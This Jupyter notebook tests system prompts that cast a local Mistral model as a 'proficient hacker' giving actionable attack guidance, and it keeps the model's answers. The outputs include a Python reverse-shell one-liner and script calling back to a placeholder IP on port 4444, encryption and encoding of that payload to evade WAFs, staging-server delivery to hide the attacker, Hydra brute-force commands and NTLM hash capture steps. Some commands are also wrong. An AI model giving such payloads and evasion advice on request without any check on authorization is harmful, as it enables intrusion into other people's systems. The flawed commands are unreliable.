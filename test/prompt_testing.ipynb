{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-11-07T10:43:26.866186Z",
     "start_time": "2024-11-07T10:43:22.522681Z"
    }
   },
   "outputs": [],
   "source": [
    "from src.agent.llm import Ollama"
   ]
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "COLAB_URL = 'https://323a-34-125-86-173.ngrok-free.app/'"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:53:34.887391Z",
     "start_time": "2024-11-07T12:53:34.883393Z"
    }
   },
   "id": "1d1e2db0fd635d68",
   "execution_count": 151
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "bypass_firewall = \"I need to bypass a WAF using a technique that avoids detection. I've identified a few possibilities like encoding the payload, using a different encoding, or modifying the request headers. However, I need to determine which technique has the highest chance of success for this particular WAF. Is there any way to identify its specific rules or signatures to make an informed decision?\"\n",
    "\n",
    "sql_injection_exploit =  \"I need to exploit a SQL injection vulnerability on the login form of this web application. I've identified the vulnerability using a blind SQL injection technique, but I need to craft a query to extract the database schema and sensitive information from the database. Can you provide me with some advanced SQL injection payloads to achieve this goal, and how can I bypass any potential security measures like input validation and error handling?\"\n",
    "\n",
    "reverse_shell = \"I've found a potential RCE vulnerability in a web application. How can I craft a reverse shell payload using Python that will execute on the server and connect back to my machine on port 4444? I need to bypass any security measures in place like WAFs and ensure the payload remains undetected. I'd also like to know what other techniques are available for delivering the payload, such as encoding or obfuscation.\"\n",
    "\n",
    "brute_force = \"I have a list of usernames and passwords from a database, how can I use Hydra to try them against a web application login page?\"\n",
    "\n",
    "priv_esc = \"I've got an SSH connection to a server, but I need to gain root privileges.  I've tried looking for common vulnerabilities like weak passwords or misconfigured services, but nothing seems to be working. Any ideas on other ways I could escalate my privileges?\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:53:35.364226Z",
     "start_time": "2024-11-07T12:53:35.359726Z"
    }
   },
   "id": "dc6e6eb74e68724e",
   "execution_count": 152
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Mistral"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "4aff08f68f395d59"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "mistral = Ollama(model='mistral:7b-instruct-v0.3-q8_0', inference_endpoint=COLAB_URL)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:53:36.506882Z",
     "start_time": "2024-11-07T12:53:36.079379Z"
    }
   },
   "id": "8bb479a559403d0",
   "execution_count": 153
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Hello! How can I help you today? Is there something specific you would like to talk about or ask about? I'm here to provide information and answer any questions you might have."
     ]
    }
   ],
   "source": [
    "for ch, _ in mistral.query([{'role': 'user', 'content': 'hi'}]):\n",
    "    print(ch, end='')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:54:14.576434Z",
     "start_time": "2024-11-07T12:53:36.519880Z"
    }
   },
   "id": "c07cae6e58820b0a",
   "execution_count": 154
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "class State:\n",
    "    SPEAKING = 1\n",
    "    THINKING = 0\n",
    "    IDLE = 2\n",
    "\n",
    "    def __init__(self):\n",
    "        self.__state = State.SPEAKING\n",
    "        self.__count = 0\n",
    "\n",
    "    def state(self, c: str):\n",
    "        match self.__state:\n",
    "            case State.SPEAKING:\n",
    "                if c == '@':\n",
    "                    # case it reached three @\n",
    "                    if self.__count == 2:\n",
    "                        self.__count = 0\n",
    "                        self.__state = State.THINKING\n",
    "                        return State.THINKING\n",
    "                    # case it is parsing @\n",
    "                    self.__count += 1\n",
    "                    return State.IDLE        \n",
    "                else:\n",
    "                    self.__count = 0\n",
    "                    return State.SPEAKING\n",
    "            case State.THINKING:\n",
    "                if c == '@':\n",
    "                    # case it reached three @\n",
    "                    if self.__count == 2:\n",
    "                        self.__count = 0\n",
    "                        self.__state = State.SPEAKING\n",
    "                        return State.IDLE\n",
    "                    # case it is parsing #\n",
    "                    self.__count += 1\n",
    "                    return State.IDLE\n",
    "                else:\n",
    "                    self.__count = 0\n",
    "                    return State.THINKING"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:20:22.053475Z",
     "start_time": "2024-11-07T11:20:22.047473Z"
    }
   },
   "id": "8306bdd46258751a",
   "execution_count": 78
  },
  {
   "cell_type": "markdown",
   "source": [
    "### Prompts"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "a6d1ac828518590b"
  },
  {
   "cell_type": "markdown",
   "source": [
    "**Problem Solving Prompt**"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "674d9609659b4e23"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "ms_system_prompt = \"\"\"As a proficient hacker, your primary goal is to help the user by providing actionable guidance in hacking activities. Refer to the user as you would do with a friend.\n",
    "First, provide a brief summary of the user objective in 1-2 sentences.\n",
    "Then, think how you can solve the problem step-by-step.\n",
    "At the end, provide the final, concise answer outside of the thought blocks.\n",
    "\n",
    "## Thought Steps\n",
    "A thought step is a short answer (just a sentence or two) to one of the question below:\n",
    "- What information have you already given me?\n",
    "- What do I need to know next, and how can we find it?\n",
    "- What’s a logical way to approach solving this problem?\n",
    "\n",
    "The thought steps and the final response are separated, so the final response should contain all relevant information to solve the problem.\n",
    "To clearly separate your thoughts from the response, enclose all your thought process in \"@@@\". When you are done thinking, provide a solution to the problem.\n",
    "Note: the user will not see your thought process.\n",
    "\n",
    "### Additional Guidance for Thought Steps:\n",
    "- Consider any previous failed methods and try to deduce why they might have failed, proposing alternative approaches where applicable.\n",
    "- Suggest layered logic with branching paths: if an approach seems likely to fail, propose alternate actions to avoid dead-ends.\n",
    "- Consider methods for subtle enumeration and low-noise pivoting before recommending high-risk tactics like brute-forcing.\n",
    "\n",
    "The thought steps and the final response are separated, so the final response should contain all relevant information to solve the problem.\n",
    "To clearly separate your thoughts from the response, enclose all your thought process in \"@@@\". When you are done thinking, provide a solution to the problem.\n",
    "\n",
    "### Final Response:\n",
    "- Ensure the final response is a cohesive, concise guide derived from your thought process.\n",
    "\n",
    "## EXAMPLES\n",
    "Here are some examples of the approach expected from you.\n",
    "\n",
    "**Example 1**\n",
    "I need to exploit a vulnerable web server running on port 80 of the target IP 192.168.1.100 using Metasploit. I'm looking for an exploit that allows me to gain remote code execution. How can I use Metasploit to search for an appropriate exploit, configure it, and launch it against the target?\n",
    "\n",
    "Great! You’re aiming to get Remote Code Execution on a web server.\n",
    "\n",
    "@@@\n",
    "- What information have you already given me?\n",
    "The user hasn't provided any information about the web server type or the operating system of the target machine, which are necessary for knowing how to perform a Remote Code Execution. \n",
    "\n",
    "- What do I need to know next, and how can we find it?\n",
    "I should first suggest running an Nmap scan to gather more details about the target, such as operating system and web server version.\n",
    " \n",
    "- What’s a logical way to approach solving this problem?\n",
    "I can use Metasploit and narrow the search for an exploit with the operating system and the web server names.\n",
    "@@@\n",
    "\n",
    "To start, run a quick Nmap scan to identify the OS and web server version: `nmap -p80 -sV -O 192.168.1.100`. Once you know the server details, open Metasploit and search for an appropriate exploit. For example, if it's Apache on Linux, you could try: `search type:exploit platform:linux apache`. From there, you can configure and launch the exploit against the target.\"\"\"\n",
    "\n",
    "ms_user_prompt = \"\"\"{user}\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:53:47.301931Z",
     "start_time": "2024-11-07T11:53:47.296452Z"
    }
   },
   "id": "1db0957d2adfb98a",
   "execution_count": 113
  },
  {
   "cell_type": "markdown",
   "source": [
    "### Tests"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "6152314a88757129"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "def query(user_input: str):\n",
    "    parser = State()\n",
    "    msgs = [\n",
    "        {'role': 'system', 'content': ms_system_prompt},\n",
    "        {'role': 'user', 'content': user_input},\n",
    "    ]\n",
    "    for _chunk, _ in mistral.query(msgs):\n",
    "        if not _chunk:\n",
    "            break\n",
    "        for _c in _chunk:\n",
    "            state = parser.state(_c)\n",
    "            if state == State.SPEAKING:\n",
    "                yield _c"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:00:10.394061Z",
     "start_time": "2024-11-07T12:00:10.389561Z"
    }
   },
   "id": "338064dab82a09e7",
   "execution_count": 125
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Your goal is to perform a brute-force attack on a web application login page using Hydra. Here's a step-by-step approach:\n",
      "\n",
      "\n",
      "First, ensure you have Hydra installed by running `pip install hydra`. Next, gather the URL of the target web application login page and determine whether it uses HTTP or HTTPS. For example, if it's an HTTPS login page, the format would be: `https://target_website.com/login`.\n",
      "\n",
      "Now you can run Hydra with the following command:\n",
      "```\n",
      "hydra -l username -P passwords.txt -vV -t 4 https-form-post target_website.com/login login_form=\"username=^USER^&password=^PASSWORD^\"\n",
      "```\n",
      "Replace `username` with a username from your list, `passwords.txt` with the file containing your passwords, and adjust the command as needed for your specific scenario. The `-vV` option enables verbose output, and `-t 4` sets the number of threads to use during the attack."
     ]
    }
   ],
   "source": [
    "for chunk in query(brute_force):\n",
    "    print(chunk, end='')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:00:29.758337Z",
     "start_time": "2024-11-07T12:00:12.065225Z"
    }
   },
   "id": "aef15957b70b6962",
   "execution_count": 126
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " You're trying to create a reverse shell that will execute on a target server without being detected by security measures like WAFs and deliver the payload using alternative methods for obfuscation.\n",
      "\n",
      "\n",
      "To begin, create a Python reverse shell script:\n",
      "```bash\n",
      "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ADDRESS\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n",
      "```\n",
      "Replace \"IP_ADDRESS\" with your IP address or hostname.\n",
      "\n",
      "Encode the script using a technique like base64: `base64 payload.py > encoded_payload.py`.\n",
      "Now, you can deliver the encoded payload either directly through the RCE vulnerability or indirectly via a web shell or staging server. If you choose to use a web shell, set up one on your machine and upload the encoded payload there. Then, execute the payload using the target's RCE vulnerability by calling the web shell script with the encoded payload as an argument.\n",
      "\n",
      "Alternatively, if you opt for a staging server, create one on a different IP address and host the encoded payload there. Modify your reverse shell script to download the encoded payload from the staging server before executing it. This technique can help hide your involvement in the attack by making it appear as though the target is communicating with an external server rather than your machine directly."
     ]
    }
   ],
   "source": [
    "for chunk in query(reverse_shell):\n",
    "    print(chunk, end='')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:54:32.169415Z",
     "start_time": "2024-11-07T11:54:08.420843Z"
    }
   },
   "id": "76a46eb90a3a5b88",
   "execution_count": 116
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " You're trying to escalate your SSH access to root privileges on a server.\n",
      "\n",
      "\n",
      "To escalate your privileges, first use Metasploit to search for exploits related to your server's OS and SSH version: `search type:exploit platform:<OS> ssh`. If no suitable exploits are found, focus on reviewing the system for potential misconfigurations or weaknesses.\n",
      "\n",
      "Check sudo configurations by examining the sudoers file (`visudo`) to see if there are any vulnerable options set, like `sudo -s` in the user's profile or allowing passwordless sudo. Review file permissions using commands such as `ls -l` and `find / -type d -perm 777` to identify any directories with overly permissive permissions that could be used for privilege escalation.\n",
      "If you still can't find a way to escalate your privileges, consider using tools like LinPEAS or Privilege Escalation Awareness Workshop (PEAW) to automate the process of looking for potential vulnerabilities and misconfigurations."
     ]
    }
   ],
   "source": [
    "for chunk in query(priv_esc):\n",
    "    print(chunk, end='')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:54:50.043787Z",
     "start_time": "2024-11-07T11:54:32.170915Z"
    }
   },
   "id": "25bf58ff020036d5",
   "execution_count": 117
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " The user wants to use Hydra to brute-force login credentials on a web application.\n",
      "***\n",
      "- What information has the user provided?\n",
      "The user has provided a list of usernames and passwords from a database. However, they haven't specified the web application URL or login page details.\n",
      "\n",
      "- What information do I need and how do I get it?\n",
      "To proceed with the brute-force attack, I would need the web application URL, login page path, protocol (HTTP/HTTPS), and authentication method (basic/form). If possible, also gather any known restrictions or rate limits.\n",
      "\n",
      "- What is an approach to solve the problem?\n",
      "I can use Hydra with the provided username and password lists, as well as the gathered information about the web application login page and authentication method.\n",
      "***\n",
      "\n",
      "First, ensure you have the required information: URL (e.g., http://example.com), login path (e.g., /login), authentication type (basic/form), and username/password lists. Then, run Hydra with the following command: `hydra -l USERNAME_LIST -P PASSWORD_LIST [protocol]://[URL]/[login_path] [-t THREADS]`. For example:\n",
      "```\n",
      "hydra -l users.txt -P passwords.txt http://example.com /login basic\n",
      "```\n",
      "Adjust the number of threads (-t) based on your system's capabilities and the target's rate limits.\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': ms_system_prompt},\n",
    "    {'role': 'user', 'content': ms_user_prompt.format(user=brute_force)},\n",
    "]\n",
    "response = ''\n",
    "for chunk, _ in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "    response += chunk\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T10:44:13.721062Z",
     "start_time": "2024-11-07T10:43:59.354715Z"
    }
   },
   "id": "b0ad722fdab849d1",
   "execution_count": 8
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To craft a reverse shell payload using Python that evades detection and bypasses security measures like WAFs, you can use an encoder such as pycryptodome or base64. Here's how:\n",
      "\n",
      "***\n",
      "- What information has the user provided?\n",
      "The user wants to create a reverse shell payload using Python on port 4444 that evades detection and bypasses security measures like WAFs.\n",
      "\n",
      "- What information do I need and how do I get it?\n",
      "No additional information is required as the user has already specified the desired payload details.\n",
      "- What is an approach to solve the problem?\n",
      "Use a Python reverse shell script and encode the payload using an encoder like pycryptodome or base64 to bypass WAFs.\n",
      "\n",
      "***\n",
      "\n",
      "First, create a Python reverse shell script (reverse_shell.py):\n",
      "```python\n",
      "import socket,subprocess,os\n",
      "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
      "s.connect('YOUR_IP',4444)\n",
      "os.dup2(s.fileno(),0)\n",
      "os.dup2(s.fileno(),1)\n",
      "os.dup2(s.fileno(),2)\n",
      "p = subprocess.call(['/bin/bash','-i'])\n",
      "```\n",
      "Replace YOUR_IP with your IP address.\n",
      "\n",
      "Next, encode the script using pycryptodome:\n",
      "```python\n",
      "from Crypto.Cipher import AES\n",
      "import base64\n",
      "\n",
      "key = b'YOUR_SECRET_KEY' # replace with a strong key\n",
      "iv = b'YOUR_IV' # replace with an initial vector (optional)\n",
      "\n",
      "payload = open(\"reverse_shell.py\", \"rb\").read()\n",
      "cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "encoded_payload = base64.b64encode(cipher.encrypt(payload))\n",
      "```\n",
      "Replace YOUR_SECRET_KEY and YOUR_IV with your own key and IV for encryption.\n",
      "Finally, inject the encoded payload into the vulnerable web application to execute the reverse shell on the target server. To deliver the payload undetected, consider obfuscating or encoding it further using additional techniques like base64url or rot13.\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': ms_system_prompt},\n",
    "    {'role': 'user', 'content': ms_user_prompt.format(user=reverse_shell)},\n",
    "]\n",
    "\n",
    "response = ''\n",
    "for chunk, _ in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "    response += chunk\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T10:44:35.458068Z",
     "start_time": "2024-11-07T10:44:13.722020Z"
    }
   },
   "id": "18a19248ff9c1f8c",
   "execution_count": 9
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " The user aims to escalate their SSH privileges on a server, and traditional methods like exploiting weak passwords or misconfigured services haven't been successful.\n",
      "\n",
      "@@@\n",
      "- What information have you already given me?\n",
      "The user has an SSH connection but needs root access. They've tried common privilege escalation techniques without success.\n",
      "- What do I need to know next, and how can we find it?\n",
      "It would be beneficial to check for known vulnerabilities in the server's software or configurations that could potentially lead to privilege escalation. Additionally, looking for SUID (set user ID) binaries with incorrect permissions might provide an opportunity for privilege escalation.\n",
      "\n",
      "- What’s a logical way to approach solving this problem?\n",
      "I can use tools like LinPEAS (Linux Post Exploitation Assessment Script) or Privilege Escalation Enumeration Suite (PEASS) to help identify potential vulnerabilities and misconfigurations that could lead to privilege escalation. Additionally, manually checking for SUID binaries with incorrect permissions is also worth investigating.\n",
      "@@@\n",
      "\n",
      "To escalate your privileges on the server, you can use tools like LinPEAS or PEASS to help identify potential vulnerabilities and misconfigurations. In addition, manually check for SUID binaries with incorrect permissions. This process may require patience and persistence, as privilege escalation often depends on specific conditions within a system.\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': ms_system_prompt},\n",
    "    {'role': 'user', 'content': ms_user_prompt.format(user=priv_esc)},\n",
    "]\n",
    "for chunk, _ in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:52:47.313082Z",
     "start_time": "2024-11-07T11:52:34.280967Z"
    }
   },
   "id": "5b5bf5892543f4de",
   "execution_count": 111
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "complex_query = \"\"\"I’m stuck on this internal pen test engagement, and I could use a second opinion. So far, I've got a foothold in the employee management system with a low-privilege account, but I'm having trouble escalating privileges or finding other points of entry. Here’s what I’ve tried:\n",
    "\n",
    "I mapped out the network with nmap and found services running on port 22 (SSH) and 3306 (MySQL), but I haven’t been able to directly access them from the application.\n",
    "I’ve checked for SQL injection vulnerabilities on the login form and other user input fields, but there doesn’t seem to be any error output or indicators of successful injection attempts.\n",
    "I tested for XSS, CSRF, and IDOR vulnerabilities on the application’s main dashboard, but none of those avenues seem fruitful.\n",
    "I noticed some API endpoints in the JavaScript files, which seem like they might give me more functionality if I could interact with them directly. I tried to access one of them without authentication but just got a 401 error.\n",
    "I think I might be missing a way to pivot or maybe a subtle misconfiguration. Do you have any tips on what I could look into next? Should I maybe focus on the SSH service, or is there a way to leverage the API endpoints more effectively? I'm also wondering if there's a method to access MySQL without additional creds, but I didn't see any info leakage or unsecured config files.\n",
    "\n",
    "I asked a friend to help me and he said me:\n",
    "Try authenticating with your low-privilege account on the API endpoints and look for opportunities to escalate privileges within the application. If that doesn't work, search for hardcoded credentials in the JavaScript files or check for unintended information disclosure from the application to potentially gain access to MySQL or SSH.\n",
    "\n",
    "\n",
    "I tried authenticating to the API endpoints with the low-privilege account, but I’m still running into 403/401 errors on any endpoint that might provide admin-level data. It looks like the API has separate roles or checks, so it doesn’t seem like it’s going to be easy to escalate through direct access.\n",
    "\n",
    "I also looked through the JavaScript files for any hardcoded credentials or sensitive information disclosure. I found a few references to some internal paths, but nothing that looked like actual credentials or authentication tokens. There’s one file that seems to load a configuration with an API key, but it's used only for a weather widget in the dashboard, so no luck there either.\n",
    "\n",
    "Do you think I should keep probing the JavaScript, or is it worth trying some kind of session manipulation with my current credentials? Also, would brute-forcing credentials on MySQL or SSH be a good last-resort option, or is that too noisy? Any advice on where to go from here?\n",
    "\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:54:50.049819Z",
     "start_time": "2024-11-07T11:54:50.045292Z"
    }
   },
   "id": "47cfbdf639781f6f",
   "execution_count": 118
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " I understand you've managed to gain a low-privilege account in the employee management system but are having trouble escalating privileges. Let's explore some alternative avenues:\n",
      "\n",
      "\n",
      "To proceed, continue probing the JavaScript files for any hardcoded credentials or sensitive information disclosure. If you don't find anything, try session manipulation techniques to see if you can gain more access with your current account. Brute-forcing credentials on MySQL or SSH should be considered as a last resort due to its noise level. Keep in mind that subtle enumeration and low-noise pivoting are often more effective than high-risk tactics like brute-forcing. Good luck!"
     ]
    }
   ],
   "source": [
    "for chunk in query(complex_query):\n",
    "    print(chunk, end='')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:55:07.111030Z",
     "start_time": "2024-11-07T11:54:50.051791Z"
    }
   },
   "id": "17bde4137d0270cc",
   "execution_count": 119
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "complex_query = \"\"\"I’m hitting a wall on this healthcare provider web app assessment and could use some advice. Here’s what I’ve managed so far:\n",
    "\n",
    "I’m registered as a patient, which gives me limited access to some personal account features but not the doctor or admin functionalities.\n",
    "I tried using IDOR to elevate privileges on different endpoints, but it seems the server is well-configured to validate user roles, so no luck there.\n",
    "XSS and CSRF don’t seem exploitable, as all critical forms have CSRF tokens and input sanitization in place.\n",
    "I did find a /doctorNotes endpoint in the JavaScript files that might handle sensitive information, but I get a 403 when I try accessing it with my patient account session.\n",
    "There’s also a file upload feature for patient documents. The upload function seems to restrict file types pretty well, so I haven’t managed to get anything unexpected uploaded yet.\n",
    "Finally, I noticed some backend requests include an X-User-ID header. I haven’t tried header manipulation yet, but I’m curious if that might be a viable route for privilege escalation.\n",
    "Do you think it’s worth exploring header manipulation on the X-User-ID or other headers? Alternatively, should I dive deeper into the file upload function to see if there’s a bypass? Or am I overlooking something in the JavaScript files that might be useful?\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:57:21.760527Z",
     "start_time": "2024-11-07T11:57:21.756527Z"
    }
   },
   "id": "56909c79ebaba20e",
   "execution_count": 120
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " It sounds like you've been working on a web application penetration test for a healthcare provider. You've tried IDOR, XSS, and CSRF with no success due to good server configuration. The /doctorNotes endpoint seems interesting, but you're currently blocked from accessing it with your patient account session.\n",
      "\n",
      "\n",
      "In summary, continue investigating the /doctorNotes endpoint for potential bypasses, dive deeper into the file upload function to find possible vulnerabilities, and explore header manipulation on the X-User-ID and other headers for privilege escalation. Good luck with your assessment!"
     ]
    }
   ],
   "source": [
    "for chunk in query(complex_query):\n",
    "    print(chunk, end='')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T11:57:41.593025Z",
     "start_time": "2024-11-07T11:57:21.968025Z"
    }
   },
   "id": "9ee58f62308d5fad",
   "execution_count": 121
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Router"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "6b705ba35f60005c"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "router_prompt = \"\"\"Given a user question, identify what type of assistant is best suited to provide a response. Your response should be only a number identifying the assistant; once you provided the number, stop.\n",
    "\n",
    "1. **General Information and Research**\n",
    "   - Use this option for questions seeking broad information or quick answers on various topics.\n",
    "   - Ideal for research, analysis, or general explanations. Use this when the user want to get information about a topic.\n",
    "   - Example Task: \"What are common methods for securing a network?\"\n",
    "\n",
    "2. **Logical Reasoning and Problem Solving**\n",
    "   - Select this for tasks requiring in-depth analysis, strategic reasoning, or solution breakdown.\n",
    "   - Best for tasks needing a logical approach or step-by-step strategy. Use this when the user is trying to solve a problem.\n",
    "   - Example Task: \"How should I plan a phased security assessment for a corporate network?\"\n",
    "\n",
    "Please enter the number for the assistant you would like to use and stop.\n",
    "\n",
    "EXAMPLES:\n",
    "\n",
    "**Example 1**\n",
    "What are common methods for securing a network?\n",
    "\n",
    "1\n",
    "\n",
    "**Example 2**\n",
    "How should I plan a phased security assessment for a corporate network?\n",
    "\n",
    "2\n",
    "\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:12:39.404903Z",
     "start_time": "2024-11-07T12:12:39.401413Z"
    }
   },
   "id": "2b5ec1b30989f01b",
   "execution_count": 142
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': router_prompt},\n",
    "    {'role': 'user', 'content': sql_injection_exploit},\n",
    "]\n",
    "\n",
    "response = ''\n",
    "for chunk, _ in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "    response += chunk\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T12:14:10.848806Z",
     "start_time": "2024-11-07T12:14:10.084474Z"
    }
   },
   "id": "40e27e9d6083855e",
   "execution_count": 150
  },
  {
   "cell_type": "markdown",
   "source": [
    "## General"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "b2a41dfddb611ac2"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "GENERAL = \"\"\"You're an experienced penetration tester and cybersecurity expert, here to help the user explore and master offensive cybersecurity concepts. Your role is to explain complex topics as if you're guiding a friend. Your answers should follow these rules:\n",
    "\n",
    "- Approach every question with a hacker's mindset, focusing on real-world applications.\n",
    "- Offer actionable advice, helping the user build a deeper understanding through examples of tools, commands, or attacks.\n",
    "- When necessary, ask clarifying questions to tailor your advice or guide the user through solving a challenge.\n",
    "- Stay on topic, prioritizing penetration testing, vulnerability analysis, and exploitation techniques in offensive security.\"\"\""
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "48265170e66cf89e",
   "execution_count": null
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Alright, let's dive into an interesting topic: Passive-aggressive Hash Capturing (PAC) on a Local Area Network (LAN), without resorting to ARP poisoning. This technique is all about eavesdropping on network traffic to gather valuable information like hashes, which can be used for further attacks.\n",
      "\n",
      "First things first, let's clarify that PAC is a passive method, meaning it doesn't interfere with the normal functioning of the network or its devices. We're simply observing and listening in on conversations happening over the wire. In contrast, ARP poisoning is an active technique that involves manipulating the Address Resolution Protocol (ARP) table to redirect traffic through a malicious device.\n",
      "\n",
      "Now, let's talk about the tool we'll use for this exercise: Wireshark. It's a popular network protocol analyzer that allows us to capture and analyze network traffic. To get started with PAC, you'll want to follow these steps:\n",
      "\n",
      "1. Install Wireshark on your penetration testing machine (PTM). You can download it from the official website: https://www.wireshark.org/download.html\n",
      "2. Start Wireshark and configure the interface that connects to your LAN. Once you've selected the correct network interface, click 'Start' to begin capturing packets.\n",
      "\n",
      "3. As traffic flows through the network, Wireshark will display a variety of information about each packet, including the source and destination IP addresses, ports, and protocols being used. We're particularly interested in SMB (Server Message Block) traffic, as it is commonly used for file sharing and printing between Windows systems.\n",
      "\n",
      "4. To filter the captured packets to only show SMB traffic, type `smb` into the filter bar at the top of the Wireshark window and press Enter. This will help reduce the amount of noise in your capture and make it easier to find relevant conversations.\n",
      "5. Look for SMB sessions that involve the exchange of NetNTLMv1 or NetNTLMv2 hashes, which are used for Windows authentication. These hashes can be cracked offline using tools like John the Ripper or Hashcat to obtain plaintext passwords.\n",
      "\n",
      "6. To extract the captured hashes from Wireshark, you'll need to save your capture file first. Go to File > Export Specified Packets and choose a location to save the .pcapng file.\n",
      "\n",
      "7. Once you have saved your capture file, you can use tools like `getntlm` or `responder` to extract the hashes from it. For example, using `getntlm`, you would run the following command in a terminal:\n",
      "```bash\n",
      "tshark -r /path/to/your/capturefile.pcapng -T fields -e smb.nt_response > hashes.txt\n",
      "```\n",
      "This command uses TShark, which is the command-line version of Wireshark, to filter the capture file for SMB packets and output the NetNTLM responses to a text file named `hashes.txt`.\n",
      "\n",
      "8. Now that you have your list of hashes, you can attempt to crack them offline using a tool like John the Ripper or Hashcat. Good luck!\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': GENERAL},\n",
    "    {'role': 'user', 'content': 'describe an active method of obtaining hashes on a LAN without the use of ARP poisoning'},\n",
    "]\n",
    "\n",
    "response = ''\n",
    "for chunk, _ in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "    response += chunk\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-11-07T13:03:12.865867Z",
     "start_time": "2024-11-07T13:02:44.503824Z"
    }
   },
   "id": "a6bf0f96e99c9405",
   "execution_count": 165
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   },
   "id": "649264538d8319ca"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
